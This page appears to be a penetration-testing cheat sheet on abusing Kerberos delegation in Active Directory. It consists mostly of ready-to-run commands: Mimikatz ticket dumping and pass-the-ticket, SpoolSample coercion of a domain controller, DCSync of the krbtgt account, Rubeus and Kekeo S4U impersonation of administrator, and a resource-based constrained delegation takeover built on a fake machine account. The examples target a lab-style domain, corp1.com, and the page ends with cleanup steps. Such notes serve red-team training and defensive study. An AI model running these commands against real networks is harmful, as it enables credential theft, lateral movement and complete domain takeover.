---
layout: page
title: "Kerberos Delegation"
---

# Kerberos Delegation

Delegation allows a service to authenticate to other services on behalf of a user. Misconfigurations in how delegation is scoped create paths from a compromised service account or workstation to domain admin.

## Unconstrained Delegation

A service configured with unconstrained delegation receives a copy of the user's TGT embedded in the TGS. Any user who authenticates to that service hands over their TGT.

```powershell
powershell -ep bypass
. .\powerview.ps1

# Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained | select dnshostname, useraccountcontrol
# DC always has unconstrained delegation: look for non-DC machines
```

Once on the target machine, wait for a privileged user to authenticate (or coerce it with Printer Bug):

```powershell
# Dump tickets in memory
mimikatz.exe
privilege::debug
sekurlsa::tickets

# Export all tickets to disk
sekurlsa::tickets /export

# Inject a specific ticket (e.g., admin's TGT)
kerberos::ptt [0;d7c02]-2-0-40e10000-admin@krbtgt-CORP1.COM.kirbi

# Verify
klist

# Use ticket to reach DC
.\PsExec.exe \\dc01 cmd
```

## Printer Bug (Force Authentication to Unconstrained Host)

Force a DC's machine account to authenticate to a machine you control (must have unconstrained delegation configured):

```powershell
# SpoolSample: coerce DC01$ to authenticate to APPSRV01
.\SpoolSample.exe dc01 appsrv01

# On appsrv01, capture DC01$'s TGT
mimikatz.exe
privilege::debug
sekurlsa::tickets /export

# Inject and DCSync
kerberos::ptt [0;...]-2-0-60a10000-DC01$@krbtgt-CORP1.COM.kirbi
lsadump::dcsync /domain:corp1.com /user:krbtgt
```

## Constrained Delegation

A service is permitted to delegate to a specific set of SPNs listed in `msDS-AllowedToDelegateTo`. The service can impersonate any user to those specific SPNs.

```powershell
# Enumerate constrained delegation
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select dnshostname, msds-allowedtodelegateto
```

```powershell
# Abuse with Rubeus: S4U2Self + S4U2Proxy to impersonate administrator
.\Rubeus.exe s4u /user:svchttp$ /rc4:<ntlm_hash> /impersonateuser:administrator /msdsspn:cifs/appsrv01.corp1.com /ptt

# Access the service
dir \\appsrv01.corp1.com\c$
.\PsExec.exe \\appsrv01.corp1.com cmd
```

Alternatively with Kekeo:

```powershell
.\kekeo.exe "tgt::ask /user:svchttp /domain:corp1.com /ntlm:<hash>"
.\kekeo.exe "tgs::s4u /tgt:TGT_svchttp@CORP1.COM.kirbi /user:administrator@corp1.com /service:cifs/appsrv01.corp1.com"
mimikatz.exe
kerberos::ptt TGS_administrator@corp1.com@CORP1.COM_cifs~appsrv01.corp1.com@CORP1.COM.kirbi
```

## Resource-Based Constrained Delegation (RBCD)

If you have `GenericWrite` or `GenericAll` on a computer account, you can configure that machine to accept delegation from any principal you control: including a machine account you create yourself.

```powershell
powershell -ep bypass
. .\powerview.ps1
. .\powermad.ps1

# Verify GenericWrite on target computer
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {
    $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_
} | Where-Object { $_.Identity -eq "$env:UserDomain\$env:Username" -and $_.ActiveDirectoryRights -match "Write" }

# Check machine account quota (default: 10)
Get-DomainObject -Identity corp1 -Properties ms-DS-MachineAccountQuota

# Create a fake computer account
New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)

# Get SID of the new account
$sid = Get-DomainComputer -Identity myComputer -Properties objectsid | Select-Object -ExpandProperty objectsid

# Build security descriptor and write to target's msDS-AllowedToActOnBehalfOfOtherIdentity
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes, 0)
Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity' = $SDbytes}

# Verify
$bytes = Get-DomainComputer appsrv01 -Properties msds-allowedtoactonbehalfofotheridentity | Select-Object -ExpandProperty msds-allowedtoactonbehalfofotheridentity
$desc = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $bytes, 0
$desc.DiscretionaryAcl
```

```powershell
# Calculate NTLM hash of machine account password
.\Rubeus.exe hash /password:h4x
# AA6EAFB522589934A6E5CE92C6438221

# S4U2Self + S4U2Proxy: get TGS for administrator to CIFS on appsrv01
.\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.corp1.com /ptt

# Verify and use
klist
dir \\appsrv01.corp1.com\c$
.\PsExec.exe \\appsrv01.corp1.com cmd
```

## Cleanup

```powershell
# Remove RBCD configuration
Set-DomainObject -Identity appsrv01 -Clear msds-allowedtoactonbehalfofotheridentity

# Remove fake computer account
Remove-ADComputer -Identity myComputer

# Purge tickets
klist purge
```
